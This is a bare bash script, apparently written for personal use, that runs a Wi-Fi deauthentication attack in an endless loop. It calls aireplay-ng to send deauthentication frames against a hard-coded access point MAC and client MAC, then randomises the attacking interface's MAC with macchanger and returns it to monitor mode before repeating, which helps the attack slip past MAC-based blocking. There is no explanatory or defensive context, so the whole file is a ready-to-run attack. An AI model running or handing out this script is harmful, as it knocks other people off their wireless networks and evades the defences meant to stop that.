#!/bin/bash

while true
do
	aireplay-ng -0 5 -a 54:2F:8A:0B:03:40 -c 60:45:CB:27:56:39 wlp3s0

	ifconfig wlp3s0 down
	macchanger -r wlp3s0 | grep "New MAC"

	iwconfig wlp3s0 mode monitor
	ifconfig wlp3s0 up
	iwconfig wlp3s0 | grep Mode

	sleep 3
	echo Waiting!!

done
